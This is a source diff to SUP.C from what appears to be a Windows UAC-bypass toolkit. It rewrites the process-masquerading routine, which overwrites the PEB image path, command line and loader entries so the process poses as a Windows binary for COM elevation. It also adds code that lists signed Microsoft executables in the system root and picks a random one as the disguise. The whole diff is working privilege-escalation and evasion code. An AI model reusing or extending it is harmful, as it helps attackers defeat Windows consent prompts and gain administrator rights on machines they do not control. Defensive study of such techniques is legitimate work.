@@ -4,9 +4,9 @@
 *
 *  TITLE:       SUP.C
 *
-*  VERSION:     3.69
+*  VERSION:     3.70
 *
-*  DATE:        12 Feb 2026
+*  DATE:        19 May 2026
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -16,6 +16,21 @@
 *******************************************************************************/
 #include "global.h"
 #include "uas.h"
+
+ptrWTGetSignatureInfo WTGetSignatureInfo = NULL;
+
+typedef struct _LDR_MASQUERADE_ENTRY {
+    PWSTR OrigImagePathName;
+    PWSTR OrigCommandLine;
+    PWSTR OrigFullDllName;
+    PWSTR OrigBaseDllName;
+
+    WCHAR FakedFullPath[MAX_PATH * 2];
+    USHORT NameOffset;
+    BOOL Restore;
+} LDR_MASQUERADE_ENTRY, * PLDR_MASQUERADE_ENTRY;
+
+static LDR_MASQUERADE_ENTRY g_LdrMasqueradeEntry;
 
 //
 // Signatures array.
@@ -1006,17 +1021,6 @@ VOID supSetLastErrorFromNtStatus(
     SetLastError(dwErrorCode);
 }
 
-static PWSTR g_lpszExplorer = NULL;
-
-typedef struct _LDR_BACKUP {
-    PWSTR ImagePathName;
-    PWSTR CommandLine;
-    PWSTR lpFullDllName;
-    PWSTR lpBaseDllName;
-} LDR_BACKUP, * PLDR_BACKUP;
-
-static LDR_BACKUP g_LdrBackup;
-
 /*
 * supxLdrEnumModulesCallback
 *
@@ -1032,21 +1036,20 @@ VOID NTAPI supxLdrEnumModulesCallback(
 )
 {
     PPEB Peb = NtCurrentPeb();
+    PLDR_MASQUERADE_ENTRY Entry = (PLDR_MASQUERADE_ENTRY)Context;
     PWSTR FullDllName, BaseDllName;
-
-    BOOL Restore = PtrToInt(Context);
 
     if (DataTableEntry->DllBase == Peb->ImageBaseAddress) {
 
-        if (Restore) {
-            FullDllName = g_LdrBackup.lpFullDllName;
-            BaseDllName = g_LdrBackup.lpBaseDllName;
+        if (Entry->Restore) {
+            FullDllName = Entry->OrigFullDllName;
+            BaseDllName = Entry->OrigBaseDllName;
         }
         else {
-            g_LdrBackup.lpBaseDllName = DataTableEntry->BaseDllName.Buffer;
-            g_LdrBackup.lpFullDllName = DataTableEntry->FullDllName.Buffer;
-            FullDllName = g_lpszExplorer;
-            BaseDllName = EXPLORER_EXE;
+            Entry->OrigBaseDllName = DataTableEntry->BaseDllName.Buffer;
+            Entry->OrigFullDllName = DataTableEntry->FullDllName.Buffer;
+            FullDllName = Entry->FakedFullPath;
+            BaseDllName = &Entry->FakedFullPath[Entry->NameOffset];
         }
 
         RtlInitUnicodeString(&DataTableEntry->FullDllName, FullDllName);
@@ -1064,74 +1067,47 @@ VOID NTAPI supxLdrEnumModulesCallback(
 *
 * Purpose:
 *
-* Fake/Restore current process information.
+* Fake/Restore current process information for COM elevation.
+* 
+* RAiGetTokenForCOM -> AipGetTokenForService -> AiCheckSecureApplicationDirectory
 *
 */
 VOID supMasqueradeProcess(
-    _In_ BOOL Restore
+    _In_ BOOL Restore,
+    _In_ LPCWSTR Target
 )
 {
-    NTSTATUS    Status;
-    PPEB        Peb = NtCurrentPeb();
-    SIZE_T      RegionSize;
-
+    PPEB Peb = NtCurrentPeb();
     PWSTR ImageFileName, CommandLine;
 
     if (Restore == FALSE) {
-
-        g_lpszExplorer = NULL;
-        RegionSize = PAGE_SIZE;
-        Status = NtAllocateVirtualMemory(
-            NtCurrentProcess(),
-            (PVOID*)&g_lpszExplorer,
-            0,
-            &RegionSize,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE);
-
-        if (NT_SUCCESS(Status)) {
-            _strcpy(g_lpszExplorer, g_ctx->szSystemRoot);
-            _strcat(g_lpszExplorer, EXPLORER_EXE);
-        }
-        else {
-            supSetLastErrorFromNtStatus(Status);
-            return;
-        }
+        RtlSecureZeroMemory(&g_LdrMasqueradeEntry, sizeof(g_LdrMasqueradeEntry));
+        _strcpy(g_LdrMasqueradeEntry.FakedFullPath, g_ctx->szSystemRoot);
+        g_LdrMasqueradeEntry.NameOffset = (USHORT)_strlen(g_LdrMasqueradeEntry.FakedFullPath);
+        _strcat(g_LdrMasqueradeEntry.FakedFullPath, Target);
     }
 
     RtlAcquirePebLock();
 
     if (Restore) {
-        CommandLine = g_LdrBackup.CommandLine;
-        ImageFileName = g_LdrBackup.ImagePathName;
+        CommandLine = g_LdrMasqueradeEntry.OrigCommandLine;
+        ImageFileName = g_LdrMasqueradeEntry.OrigImagePathName;
+        g_LdrMasqueradeEntry.Restore = TRUE;
     }
     else {
-        g_LdrBackup.ImagePathName = Peb->ProcessParameters->ImagePathName.Buffer;
-        g_LdrBackup.CommandLine = Peb->ProcessParameters->CommandLine.Buffer;
+        g_LdrMasqueradeEntry.OrigImagePathName = Peb->ProcessParameters->ImagePathName.Buffer;
+        g_LdrMasqueradeEntry.OrigCommandLine = Peb->ProcessParameters->CommandLine.Buffer;
 
-        ImageFileName = g_lpszExplorer;
-        CommandLine = EXPLORER_EXE;
+        ImageFileName = g_LdrMasqueradeEntry.FakedFullPath;
+        CommandLine = &g_LdrMasqueradeEntry.FakedFullPath[g_LdrMasqueradeEntry.NameOffset];
     }
 
     RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, ImageFileName);
     RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, CommandLine);
 
-    if (Restore) {
-
-        RegionSize = 0;
-        NtFreeVirtualMemory(
-            NtCurrentProcess(),
-            (PVOID*)&g_lpszExplorer,
-            &RegionSize,
-            MEM_RELEASE);
-
-        g_lpszExplorer = NULL;
-
-    }
-
     RtlReleasePebLock();
 
-    LdrEnumerateLoadedModules(0, &supxLdrEnumModulesCallback, IntToPtr(Restore));
+    LdrEnumerateLoadedModules(0, &supxLdrEnumModulesCallback, (PVOID)&g_LdrMasqueradeEntry);
 }
 
 /*
@@ -4654,4 +4630,331 @@ BOOLEAN supReplaceVersionInfo(
         supSecureVirtualFree(pvBuffer, bufferSize, NULL);
 
     return bResult;
+}
+
+/*
+* supEnumPathEnvironmentVariable
+*
+* Purpose:
+*
+* Enumerate environment variables and execute callback on each.
+*
+*/
+BOOLEAN supEnumPathEnvironmentVariable(
+    _In_ PSUP_ENUM_PATH_CALLBACK Callback,
+    _In_opt_ PVOID Context
+)
+{
+    ULONG          i;
+    LPCWSTR        lpPath;
+    UNICODE_STRING usPath;
+    WCHAR          szBuffer[MAX_PATH * 4];
+
+    if (Callback == NULL)
+        return FALSE;
+
+    RtlInitUnicodeString(&usPath, L"PATH=");
+
+    lpPath = supQueryEnvironmentVariableOffset(&usPath);
+    if (lpPath == NULL || *lpPath == 0)
+        return FALSE;
+
+    do {
+
+        i = 0;
+
+        while (*lpPath != 0 && *lpPath != L';') {
+            if (i < RTL_NUMBER_OF(szBuffer) - 1)
+                szBuffer[i++] = *lpPath;
+
+            lpPath++;
+        }
+
+        szBuffer[i] = 0;
+
+        if (i != 0) {
+            if (Callback(szBuffer, Context) == FALSE)
+                return FALSE;
+        }
+
+        if (*lpPath == 0)
+            break;
+
+        lpPath++;
+
+    } while (TRUE);
+
+    return TRUE;
+}
+
+/*
+* supxAddExecutableToList
+*
+* Purpose:
+*
+* Insert executable data to the list.
+*
+*/
+BOOLEAN supxAddExecutableToList(
+    _Inout_ PSUP_EXECUTABLE_LIST List,
+    _In_ LPCWSTR FullPath,
+    _In_ LPCWSTR FileName
+)
+{
+    SIZE_T cchFullPath;
+    SIZE_T cchDirectory;
+    PSUP_EXECUTABLE_ENTRY Entry;
+
+    cchFullPath = _strlen(FullPath);
+
+    Entry = (PSUP_EXECUTABLE_ENTRY)RtlAllocateHeap(NtCurrentPeb()->ProcessHeap,
+        HEAP_ZERO_MEMORY,
+        sizeof(SUP_EXECUTABLE_ENTRY));
+
+    if (Entry == NULL)
+        return FALSE;
+
+    RtlCopyMemory(
+        Entry->FullPath,
+        FullPath,
+        (cchFullPath + 1) * sizeof(WCHAR));
+
+    //
+    // Compute offset to filename portion.
+    //
+    cchDirectory = cchFullPath - _strlen(FileName);
+    Entry->NameOffset = (USHORT)cchDirectory;
+
+    InsertTailList(
+        &List->ListHead,
+        &Entry->ListEntry);
+
+    List->Count++;
+
+    return TRUE;
+}
+
+/*
+* supFreeExecutableList
+*
+* Purpose:
+*
+* Free memory allocated for executable list.
+*
+*/
+VOID supFreeExecutableList(
+    _Inout_ PSUP_EXECUTABLE_LIST List
+)
+{
+    PLIST_ENTRY Entry;
+    PSUP_EXECUTABLE_ENTRY Item;
+
+    while (!IsListEmpty(&List->ListHead)) {
+        Entry = RemoveHeadList(&List->ListHead);
+
+        Item = CONTAINING_RECORD(
+            Entry,
+            SUP_EXECUTABLE_ENTRY,
+            ListEntry);
+
+        RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, Item);
+    }
+
+    List->Count = 0;
+}
+
+/*
+* supSelectRandomExecutable
+*
+* Purpose:
+*
+* Return pseudo-random value from executables list.
+*
+*/
+PSUP_EXECUTABLE_ENTRY supSelectRandomExecutable(
+    _In_ PSUP_EXECUTABLE_LIST List
+)
+{
+    ULONG Index;
+    ULONG Current;
+    PLIST_ENTRY Entry;
+
+    if (List->Count == 0)
+        return NULL;
+
+    Index = (ULONG)(__rdtsc() % List->Count);
+
+    Current = 0;
+
+    Entry = List->ListHead.Flink;
+
+    while (Entry != &List->ListHead) {
+        if (Current == Index) {
+            return CONTAINING_RECORD(
+                Entry,
+                SUP_EXECUTABLE_ENTRY,
+                ListEntry);
+        }
+
+        Current++;
+
+        Entry = Entry->Flink;
+    }
+
+    return NULL;
+}
+
+/*
+* supxVerifyFileIsIsOsBinary
+*
+* Purpose:
+*
+* Verify that given file is part of OS.
+*
+*/
+BOOL supxVerifyFileIsIsOsBinary(
+    _In_ LPCWSTR FileName
+)
+{
+    BOOL bResult = FALSE;
+    LONG status;
+    HANDLE fileHandle;
+    OBJECT_ATTRIBUTES attr;
+    UNICODE_STRING usFileName;
+    IO_STATUS_BLOCK iosb;
+    SIGNATURE_INFO sigInfo;
+
+    if (RtlDosPathNameToNtPathName_U(FileName, &usFileName, NULL, NULL) == FALSE)
+        return FALSE;
+
+    do {
+
+        InitializeObjectAttributes(&attr, &usFileName,
+            OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+        RtlSecureZeroMemory(&iosb, sizeof(iosb));
+        status = NtCreateFile(&fileHandle, SYNCHRONIZE | FILE_READ_DATA,
+            &attr, &iosb, NULL, 0, FILE_SHARE_READ, FILE_OPEN,
+            FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
+
+        if (!NT_SUCCESS(status))
+            break;
+
+        RtlSecureZeroMemory(&sigInfo, sizeof(sigInfo));
+        sigInfo.cbSize = sizeof(sigInfo);
+
+        status = WTGetSignatureInfo(
+            (LPWSTR)FileName,
+            fileHandle,
+            SIF_BASE_VERIFICATION | SIF_CHECK_OS_BINARY | SIF_CATALOG_SIGNED,
+            &sigInfo,
+            NULL,
+            NULL);
+
+        NtClose(fileHandle);
+
+        if (status != ERROR_SUCCESS)
+            break;
+
+        if (sigInfo.SignatureState != SIGNATURE_STATE_VALID)
+            break;
+
+        bResult = sigInfo.fOSBinary;
+
+    } while (FALSE);
+
+    RtlFreeUnicodeString(&usFileName);
+
+    return bResult;
+}
+
+/*
+* supxEnumMicrosoftExecutablesInRoot
+*
+* Purpose:
+*
+* Enumerate Microsoft executables in the Windows root directory.
+*
+*/
+BOOLEAN supxEnumMicrosoftExecutables(
+    _Inout_ PSUP_EXECUTABLE_LIST List
+)
+{
+    WCHAR szSearch[MAX_PATH * 2];
+    WCHAR szFullPath[MAX_PATH * 2];
+    WIN32_FIND_DATAW FindData;
+    HANDLE FindHandle;
+
+    RtlSecureZeroMemory(&szSearch, sizeof(szSearch));
+    _strcpy(szSearch, USER_SHARED_DATA->NtSystemRoot);
+    supConcatenatePaths(szSearch, L"*.exe", MAX_PATH);
+
+    FindHandle = FindFirstFile(
+        szSearch,
+        &FindData);
+
+    if (FindHandle == INVALID_HANDLE_VALUE) {
+        return FALSE;
+    }
+
+    do {
+
+        if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+            continue;
+
+        _strcpy(szFullPath, USER_SHARED_DATA->NtSystemRoot);
+        supConcatenatePaths(szFullPath, FindData.cFileName, MAX_PATH);
+
+        if (supxVerifyFileIsIsOsBinary(szFullPath)) {
+
+            supxAddExecutableToList(
+                List,
+                szFullPath,
+                FindData.cFileName);
+
+        }
+
+        if (List->Count > 20)
+            break;
+
+    } while (FindNextFile(FindHandle, &FindData));
+
+    FindClose(FindHandle);
+
+    return (List->Count != 0);
+}
+
+/*
+* supBuildSystemRootExecutableList
+*
+* Purpose:
+*
+* Remember all Microsoft executables from the system root.
+*
+*/
+BOOLEAN supBuildSystemRootExecutableList(
+    _Inout_ PSUP_EXECUTABLE_LIST List
+)
+{
+    HMODULE hModule;
+    WCHAR szPath[MAX_PATH * 2];
+
+    RtlSecureZeroMemory(szPath, sizeof(szPath));
+    _strcpy(szPath, USER_SHARED_DATA->NtSystemRoot);
+    supConcatenatePaths(szPath, SYSTEM32_DIR, MAX_PATH);
+    supConcatenatePaths(szPath, L"wintrust.dll", MAX_PATH);
+
+    hModule = LoadLibraryEx(szPath, NULL, 0);
+    if (hModule != NULL) {
+        WTGetSignatureInfo = (ptrWTGetSignatureInfo)GetProcAddress(hModule, "WTGetSignatureInfo");
+        if (WTGetSignatureInfo == NULL)
+            return FALSE;
+    }
+
+    InitializeListHead(&List->ListHead);
+    List->Count = 0;
+
+    supxEnumMicrosoftExecutables(List);
+
+    return (List->Count != 0);
 }
